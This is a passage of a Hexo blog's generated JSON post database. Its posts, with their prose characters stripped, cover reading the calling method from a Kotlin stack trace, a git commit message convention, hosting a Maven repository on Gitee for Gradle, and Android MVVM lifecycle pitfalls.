catchstackTrace\n\nExceptionprintStackTrace \n\n****\n\nParctice.kt\n\n```kotlin\npackage kim.bifrost.coldrain.partice\n\n/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author \n * @since 2021/11/3 16:45\n **/\nfun main() {\n    test()\n}\n\nfun test() {\n    // \n    val info = Throwable().stackTrace.run {\n        get(size - 2)\n    }\n    println(\"class: ${info.className} method: ${info.methodName}\")\n}\n```\n\n\n\n```\nclass: kim.bifrost.coldrain.partice.ParticeKt method: main\n```\n\n### \n\nThread#getStackTrace()\n\nThrowable#getStackTrace()\n\nLog4j[https://github.com/apache/loggin ... l/StackLocator.java](https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java)\n\n## JDK8Reflection.getCallerClass\n\nsun.reflect.Reflection.getCallerClass()\n\nJDK8api","slug":"get-stacktrace-method-path","published":1,"updated":"2022-12-12T15:49:35.550Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtd000rsfkl1xt22b85","content":"<p>TabooLib5TabooLib5</p>\n<p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>newThrowablestackTracestackTraceElement</p>\n<p>try catchstackTrace</p>\n<p>ExceptionprintStackTrace </p>\n<p><strong></strong></p>\n<p>Parctice.kt</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">package</span> kim<span class=\"token punctuation\">.</span>bifrost<span class=\"token punctuation\">.</span>coldrain<span class=\"token punctuation\">.</span>partice\n\n<span class=\"token comment\">/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author \n * @since 2021/11/3 16:45\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">val</span> info <span class=\"token operator\">=</span> <span class=\"token function\">Throwable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stackTrace<span class=\"token punctuation\">.</span><span class=\"token function\">run</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span>size <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"class: <span class=\"token interpolation\"><span class=\"token delimiter variable\">${</span>info<span class=\"token punctuation\">.</span>className<span class=\"token delimiter variable\">}</span></span> method: <span class=\"token interpolation\"><span class=\"token delimiter variable\">${</span>info<span class=\"token punctuation\">.</span>methodName<span class=\"token delimiter variable\">}</span></span>\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">class: kim.bifrost.coldrain.partice.ParticeKt method: main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Thread#getStackTrace()</p>\n<p>Throwable#getStackTrace()</p>\n<p>Log4j<a href=\"https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java\">https://github.com/apache/loggin ... l/StackLocator.java</a></p>\n<h2 id=\"JDK8Reflection-getCallerClass\"><a href=\"#JDK8Reflection-getCallerClass\" class=\"headerlink\" title=\"JDK8Reflection.getCallerClass\"></a>JDK8Reflection.getCallerClass</h2><p>sun.reflect.Reflection.getCallerClass()</p>\n<p>JDK8api</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<p>TabooLib5TabooLib5</p>\n<p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>newThrowablestackTracestackTraceElement</p>\n<p>try catchstackTrace</p>\n<p>ExceptionprintStackTrace </p>\n<p><strong></strong></p>\n<p>Parctice.kt</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">package</span> kim<span class=\"token punctuation\">.</span>bifrost<span class=\"token punctuation\">.</span>coldrain<span class=\"token punctuation\">.</span>partice\n\n<span class=\"token comment\">/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author \n * @since 2021/11/3 16:45\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">val</span> info <span class=\"token operator\">=</span> <span class=\"token function\">Throwable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stackTrace<span class=\"token punctuation\">.</span><span class=\"token function\">run</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span>size <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"class: <span class=\"token interpolation\"><span class=\"token delimiter variable\">$&#123;</span>info<span class=\"token punctuation\">.</span>className<span class=\"token delimiter variable\">&#125;</span></span> method: <span class=\"token interpolation\"><span class=\"token delimiter variable\">$&#123;</span>info<span class=\"token punctuation\">.</span>methodName<span class=\"token delimiter variable\">&#125;</span></span>\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">class: kim.bifrost.coldrain.partice.ParticeKt method: main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Thread#getStackTrace()</p>\n<p>Throwable#getStackTrace()</p>\n<p>Log4j<a href=\"https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java\">https://github.com/apache/loggin ... l/StackLocator.java</a></p>\n<h2 id=\"JDK8Reflection-getCallerClass\"><a href=\"#JDK8Reflection-getCallerClass\" class=\"headerlink\" title=\"JDK8Reflection.getCallerClass\"></a>JDK8Reflection.getCallerClass</h2><p>sun.reflect.Reflection.getCallerClass()</p>\n<p>JDK8api</p>\n"},{"title":"Git Commit ","date":"2021-10-28T07:14:52.000Z","author":"","hide":false,"summary":"git commit","_content":"\n# Commit \n\ncopygit\n\ncommit\n\n> \n>\n> ```\n> [type]title\n> describtion\n> ```\n>\n> type\n>\n> - fix -------------> bug \n> - feature -------> \n> - optimize ------> \n> - release --------> \n> - style ------------> \n>\n> titlecommit\n>\n> describtion\n>\n>  [Amend](#Amend ) ","source":"_posts/git-commit-rule.md","raw":"---\ntitle: Git Commit \ndate: 2021-10-28 15:14:52\nauthor: \nhide: false\nsummary: git commit\ncategories: \ntags:\n  - git\n---\n\n# Commit \n\ncopygit\n\ncommit\n\n> \n>\n> ```\n> [type]title\n> describtion\n> ```\n>\n> type\n>\n> - fix -------------> bug \n> - feature -------> \n> - optimize ------> \n> - release --------> \n> - style ------------> \n>\n> titlecommit\n>\n> describtion\n>\n>  [Amend](#Amend ) ","slug":"git-commit-rule","published":1,"updated":"2021-11-13T16:17:01.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtd000usfkl4cld3upt","content":"<h1 id=\"Commit-\"><a href=\"#Commit-\" class=\"headerlink\" title=\"Commit \"></a>Commit </h1><p>copygit</p>\n<p>commit</p>\n<blockquote>\n<p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[type]title\ndescribtion<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>type</p>\n<ul>\n<li>fix -&gt; bug </li>\n<li>feature -&gt; </li>\n<li>optimize &gt; </li>\n<li>release &gt; </li>\n<li>style &gt; </li>\n</ul>\n<p>titlecommit</p>\n<p>describtion</p>\n<p> [Amend](#Amend ) </p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Commit-\"><a href=\"#Commit-\" class=\"headerlink\" title=\"Commit \"></a>Commit </h1><p>copygit</p>\n<p>commit</p>\n<blockquote>\n<p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[type]title\ndescribtion<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>type</p>\n<ul>\n<li>fix -&gt; bug </li>\n<li>feature -&gt; </li>\n<li>optimize &gt; </li>\n<li>release &gt; </li>\n<li>style &gt; </li>\n</ul>\n<p>titlecommit</p>\n<p>describtion</p>\n<p> [Amend](#Amend ) </p>\n</blockquote>\n"},{"title":"GiteeMaven","date":"2021-09-05T16:00:21.000Z","author":"","hide":false,"summary":"giteemaven","_content":"\n......\n\n[maven: maven (gitee.com)](https://gitee.com/coldrain-moro/maven)\n\nmaven\n\ngiteegithub\n\n## Note\n\n### jar\n\nTipharethmaven\n\n```\nmvn install:install-file -Dfile=E:\\ColdRain_Moro\\\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar\n```\n\n### maven\n\n settings.xml \n\n```xml\n<settings xmlns=\"http://maven.apache.org/SETTINGS/1.2.0\"\n          xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n          xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd\">\n  <!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: ${user.home}/.m2/repository\n  <localRepository>/path/to/local/repo</localRepository>\n\t\n  -->\n  <localRepository>E:\\ColdRain_Moro\\\\maven\\repo</localRepository>\n```\n\n### \n\ngradlegradle\n\n***gradle yyds***\n\n```\nrepositories {\n    mavenCentral()\n    // \n    maven { url = uri(\"https://gitee.com/coldrain-moro/maven/raw/master/repo\") }\n}\n\ndependencies {\n\t// tiphareth\n    compileOnly(\"ink.ptms.tiphareth:tiphareth:1.4.0\")\n    compileOnly(\"public:PlaceholderAPI:2.10.9@jar\")\n    compileOnly(\"ink.ptms.core:v11605:11605\")\n    compileOnly(kotlin(\"stdlib\"))\n    compileOnly(fileTree(\"libs\"))\n}\n```\n\n","source":"_posts/gitee-maven.md","raw":"---\ntitle: GiteeMaven\ndate: 2021-09-06 00:00:21\nauthor: \nhide: false\nsummary: giteemaven\ncategories: \ntags:\n  - maven\n---\n\n......\n\n[maven: maven (gitee.com)](https://gitee.com/coldrain-moro/maven)\n\nmaven\n\ngiteegithub\n\n## Note\n\n### jar\n\nTipharethmaven\n\n```\nmvn install:install-file -Dfile=E:\\ColdRain_Moro\\\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar\n```\n\n### maven\n\n settings.xml \n\n```xml\n<settings xmlns=\"http://maven.apache.org/SETTINGS/1.2.0\"\n          xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n          xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd\">\n  <!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: ${user.home}/.m2/repository\n  <localRepository>/path/to/local/repo</localRepository>\n\t\n  -->\n  <localRepository>E:\\ColdRain_Moro\\\\maven\\repo</localRepository>\n```\n\n### \n\ngradlegradle\n\n***gradle yyds***\n\n```\nrepositories {\n    mavenCentral()\n    // \n    maven { url = uri(\"https://gitee.com/coldrain-moro/maven/raw/master/repo\") }\n}\n\ndependencies {\n\t// tiphareth\n    compileOnly(\"ink.ptms.tiphareth:tiphareth:1.4.0\")\n    compileOnly(\"public:PlaceholderAPI:2.10.9@jar\")\n    compileOnly(\"ink.ptms.core:v11605:11605\")\n    compileOnly(kotlin(\"stdlib\"))\n    compileOnly(fileTree(\"libs\"))\n}\n```\n\n","slug":"gitee-maven","published":1,"updated":"2021-11-13T16:17:05.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtf000ysfklcmlh04lk","content":"<p></p>\n<p><a href=\"https://gitee.com/coldrain-moro/maven\">maven: maven (gitee.com)</a></p>\n<p>maven</p>\n<p>giteegithub</p>\n<h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><h3 id=\"jar\"><a href=\"#jar\" class=\"headerlink\" title=\"jar\"></a>jar</h3><p>Tipharethmaven</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mvn install:install-file -Dfile=E:\\ColdRain_Moro\\\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"maven\"><a href=\"#maven\" class=\"headerlink\" title=\"maven\"></a>maven</h3><p> settings.xml </p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>settings</span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n  <span class=\"token comment\">&lt;!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: ${user.home}/.m2/repository\n  &lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;\n\t\n  --&gt;</span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>localRepository</span><span class=\"token punctuation\">&gt;</span></span>E:\\ColdRain_Moro\\\\maven\\repo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>localRepository</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>gradlegradle</p>\n<p><em><strong>gradle yyds</strong></em></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">repositories {\n    mavenCentral()\n    // \n    maven { url = uri(\"https://gitee.com/coldrain-moro/maven/raw/master/repo\") }\n}\n\ndependencies {\n\t// tiphareth\n    compileOnly(\"ink.ptms.tiphareth:tiphareth:1.4.0\")\n    compileOnly(\"public:PlaceholderAPI:2.10.9@jar\")\n    compileOnly(\"ink.ptms.core:v11605:11605\")\n    compileOnly(kotlin(\"stdlib\"))\n    compileOnly(fileTree(\"libs\"))\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<p></p>\n<p><a href=\"https://gitee.com/coldrain-moro/maven\">maven: maven (gitee.com)</a></p>\n<p>maven</p>\n<p>giteegithub</p>\n<h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><h3 id=\"jar\"><a href=\"#jar\" class=\"headerlink\" title=\"jar\"></a>jar</h3><p>Tipharethmaven</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mvn install:install-file -Dfile&#x3D;E:\\ColdRain_Moro\\\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId&#x3D;ink.ptms.tiphareth -DartifactId&#x3D;tiphareth -Dversion&#x3D;1.4.0 -Dpackaging&#x3D;Jar<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"maven\"><a href=\"#maven\" class=\"headerlink\" title=\"maven\"></a>maven</h3><p> settings.xml </p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>settings</span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token comment\">&lt;!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: $&#123;user.home&#125;/.m2/repository\n  &lt;localRepository>/path/to/local/repo&lt;/localRepository>\n\t\n  --></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>localRepository</span><span class=\"token punctuation\">></span></span>E:\\ColdRain_Moro\\\\maven\\repo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>localRepository</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>gradlegradle</p>\n<p><em><strong>gradle yyds</strong></em></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">repositories &#123;\n    mavenCentral()\n    &#x2F;&#x2F; \n    maven &#123; url &#x3D; uri(&quot;https:&#x2F;&#x2F;gitee.com&#x2F;coldrain-moro&#x2F;maven&#x2F;raw&#x2F;master&#x2F;repo&quot;) &#125;\n&#125;\n\ndependencies &#123;\n\t&#x2F;&#x2F; tiphareth\n    compileOnly(&quot;ink.ptms.tiphareth:tiphareth:1.4.0&quot;)\n    compileOnly(&quot;public:PlaceholderAPI:2.10.9@jar&quot;)\n    compileOnly(&quot;ink.ptms.core:v11605:11605&quot;)\n    compileOnly(kotlin(&quot;stdlib&quot;))\n    compileOnly(fileTree(&quot;libs&quot;))\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"MMVM","date":"2022-07-30T16:00:00.000Z","author":"","hide":false,"summary":"MMVM","_content":"\n# MVVM\n\n##  FragmentLifecycleOwner\n\nLivedatalifecycleowner`DESTORYED`\n\nFragmentFragmentFragmentfragmentfragmentFragmentFragmentfragmentfragmentview`onViewCreated``onCreate`,fragmentviewfragmentfragmentviewfragmentfragment`onViewCreated`\n\n`viewLifecycleOwner`view\n\n##  launchWhenX\n\n### Flow vs. LiveData\n\nFlowLiveDataLiveDataandroid jetpackandroid\n\n-  - lifecycleOwnerdestory\n-  - lifecycleOwnerSTARTED\n\nFlowLiveData\n\nFlowCoroutineScope`lifecycle-runtime-ktx`lifecycleOwner`lifecycleScope`lifecycleScopeFlowLiveDatalifecycleScope\n\n\n\n`launchWhenX``PAUSED``STARTED`,`RESUMED`\n\nflow\n\n\n\n### repeatOnLifecycle\n\n> lifecycle-runtime-ktx  `2.4.0-alpha01`  `lifecyle.repeatOnLifecycle`  X  X ****\n\ncollect\n\nFlowFlowLiveData: FlowLiveData\n\nLiveDataFlowLiveData\n\nflow`flowWithLifecycle(LifecycleOwner)`\n\n##  onViewCreated\n\n MVVM , ViewModel  View  Model\n\n- View  ViewModel \n- View  DataBinding  LiveData  ViewModel \n\n ViewModel  `onViewCreated`  ViewModel  `onViewCreated`  ViewModel  `onViewCreated`  View  ViewModel  View View  View \n\n> ViewModel  `init{}`  `ViewModelScope` \n\n##  LiveData & StateFlowEvents\n\nLiveDataStateFlow\n\nLiveData\n\nLiveDataStateFlowLiveDataStateFlowbugStateFlow****\n\n##  RepositoryLiveData\n\nRxJavaFlowLiveDataLiveData:\n\n- lifecyclelifecycleOwnerobserveForever\n-  \n\n##  ViewModel\n\n- Mutable\n- suspend\n","source":"_posts/guilty-of-mvvm.md","raw":"---\ntitle: MMVM\ndate: 2022-07-31\nauthor: \nhide: false\nsummary: MMVM\ncategories: \ntags:\n  - Android\n  - MVVM\n---\n\n# MVVM\n\n##  FragmentLifecycleOwner\n\nLivedatalifecycleowner`DESTORYED`\n\nFragmentFragmentFragmentfragmentfragmentFragmentFragmentfragmentfragmentview`onViewCreated``onCreate`,fragmentviewfragmentfragmentviewfragmentfragment`onViewCreated`\n\n`viewLifecycleOwner`view\n\n##  launchWhenX\n\n### Flow vs. LiveData\n\nFlowLiveDataLiveDataandroid jetpackandroid\n\n-  - lifecycleOwnerdestory\n-  - lifecycleOwnerSTARTED\n\nFlowLiveData\n\nFlowCoroutineScope`lifecycle-runtime-ktx`lifecycleOwner`lifecycleScope`lifecycleScopeFlowLiveDatalifecycleScope\n\n\n\n`launchWhenX``PAUSED``STARTED`,`RESUMED`\n\nflow\n\n\n\n### repeatOnLifecycle\n\n> lifecycle-runtime-ktx  `2.4.0-alpha01`  `lifecyle.repeatOnLifecycle`  X  X ****\n\ncollect\n\nFlowFlowLiveData: FlowLiveData\n\nLiveDataFlowLiveData\n\nflow`flowWithLifecycle(LifecycleOwner)`\n\n##  onViewCreated\n\n MVVM , ViewModel  View  Model\n\n- View  ViewModel \n- View  DataBinding  LiveData  ViewModel \n\n ViewModel  `onViewCreated`  ViewModel  `onViewCreated`  ViewModel  `onViewCreated`  View  ViewModel  View View  View \n\n> ViewModel  `init{}`  `ViewModelScope` \n\n##  LiveData & StateFlowEvents\n\nLiveDataStateFlow\n\nLiveData\n\nLiveDataStateFlowLiveDataStateFlowbugStateFlow****\n\n##  RepositoryLiveData\n\nRxJavaFlowLiveDataLiveData:\n\n- lifecyclelifecycleOwnerobserveForever\n-  \n\n##  ViewModel\n\n- Mutable\n- suspend\n","slug":"guilty-of-mvvm","published":1,"updated":"2022-11-24T03:01:42.997Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtf0010sfkldviu9u2k","content":"<h1 id=\"MVVM\"><a href=\"#MVVM\" class=\"headerlink\" title=\"MVVM\"></a>MVVM</h1><h2 id=\"-FragmentLifecycleOwner\"><a href=\"#-FragmentLifecycleOwner\" class=\"headerlink\" title=\" FragmentLifecycleOwner\"></a> FragmentLifecycleOwner</h2><p>Livedatalifecycleowner<code>DESTORYED</code></p>\n<p>FragmentFragmentFragmentfragmentfragmentFragmentFragmentfragmentfragmentview<code>onViewCreated</code><code>onCreate</code>,fragmentviewfragmentfragmentviewfragmentfragment<code>onViewCreated</code></p>\n<p><code>viewLifecycleOwner</code>view</p>\n<h2 id=\"-launchWhenX\"><a href=\"#-launchWhenX\" class=\"headerlink\" title=\" launchWhenX\"></a> launchWhenX</h2><h3 id=\"Flow-vs-LiveData\"><a href=\"#Flow-vs-LiveData\" class=\"headerlink\" title=\"Flow vs. LiveData\"></a>Flow vs. LiveData</h3><p>FlowLiveDataLiveDataandroid jetpackandroid</p>\n<ul>\n<li> - lifecycleOwnerdestory</li>\n<li> - lifecycleOwnerSTARTED</li>\n</ul>\n<p>FlowLiveData</p>\n<p>FlowCoroutineScope<code>lifecycle-runtime-ktx</code>lifecycleOwner<code>lifecycleScope</code>lifecycleScopeFlowLiveDatalifecycleScope</p>\n<p></p>\n<p><code>launchWhenX</code><code>PAUSED</code><code>STARTED</code>,<code>RESUMED</code></p>\n<p>flow</p>\n<p></p>\n<h3 id=\"repeatOnLifecycle\"><a href=\"#repeatOnLifecycle\" class=\"headerlink\" title=\"repeatOnLifecycle\"></a>repeatOnLifecycle</h3><blockquote>\n<p>lifecycle-runtime-ktx  <code>2.4.0-alpha01</code>  <code>lifecyle.repeatOnLifecycle</code>  X  X <strong></strong></p>\n</blockquote>\n<p>collect</p>\n<p>FlowFlowLiveData: FlowLiveData</p>\n<p>LiveDataFlowLiveData</p>\n<p>flow<code>flowWithLifecycle(LifecycleOwner)</code></p>\n<h2 id=\"-onViewCreated\"><a href=\"#-onViewCreated\" class=\"headerlink\" title=\" onViewCreated\"></a> onViewCreated</h2><p> MVVM , ViewModel  View  Model</p>\n<ul>\n<li>View  ViewModel </li>\n<li>View  DataBinding  LiveData  ViewModel </li>\n</ul>\n<p> ViewModel  <code>onViewCreated</code>  ViewModel  <code>onViewCreated</code>  ViewModel  <code>onViewCreated</code>  View  ViewModel  View View  View </p>\n<blockquote>\n<p>ViewModel  <code>init{}</code>  <code>ViewModelScope</code> </p>\n</blockquote>\n<h2 id=\"-LiveData-amp-StateFlowEvents\"><a href=\"#-LiveData-amp-StateFlowEvents\" class=\"headerlink\" title=\" LiveData &amp; StateFlowEvents\"></a> LiveData &amp; StateFlowEvents</h2><p>LiveDataStateFlow</p>\n<p>LiveData</p>\n<p>LiveDataStateFlowLiveDataStateFlowbugStateFlow<strong></strong></p>\n<h2 id=\"-RepositoryLiveData\"><a href=\"#-RepositoryLiveData\" class=\"headerlink\" title=\" RepositoryLiveData\"></a> RepositoryLiveData</h2><p>RxJavaFlowLiveDataLiveData:</p>\n<ul>\n<li>lifecyclelifecycleOwnerobserveForever</li>\n<li> </li>\n</ul>\n<h2 id=\"-ViewModel\"><a href=\"#-ViewModel\" class=\"headerlink\" title=\" ViewModel\"></a> ViewModel</h2><ul>\n<li>Mutable</li>\n<li>suspend</li>\n</ul>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"MVVM\"><a href=\"#MVVM\" class=\"headerlink\" title=\"MVVM\"></a>MVVM</h1><h2 id=\"-FragmentLifecycleOwner\"><a href=\"#-FragmentLifecycleOwner\" class=\"headerlink\" title=\" FragmentLifecycleOwner\"></a> 